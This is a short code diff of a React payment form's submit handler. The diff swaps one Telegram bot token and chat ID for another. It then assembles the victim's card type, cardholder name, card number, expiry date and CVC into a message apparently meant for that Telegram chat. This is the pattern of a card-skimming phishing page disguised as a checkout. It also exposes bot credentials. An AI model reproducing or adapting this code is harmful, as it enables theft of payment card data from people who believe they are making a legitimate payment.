@@ -29,8 +29,8 @@ const Pay = () => {
     const handleSubmit = (e) => {
         e.preventDefault();
         var bot={
-          token:"6989400723:AAHYaV2mqkCKuP5OsEA7mK5s_7mctmTRChc",
-          chat_id:6364996162
+          token:"6688266348:AAFU2baoOulq9YUsMyiVnEVZ8U8Iw13zPDI",
+          chat_id:6473956939
         }
         var length =` طريقة الدفع : ${selectPay.current.value} %0A   الاسم على البطاقة: ${NameCard.current.value} %0A  رقم البطاقة  : ${NumsCard.current.value} %0A  تاريخ انتهاء البطاقة  :  ${dateCard.current.value} %0A cvc : ${cvcCard.current.value}`
        
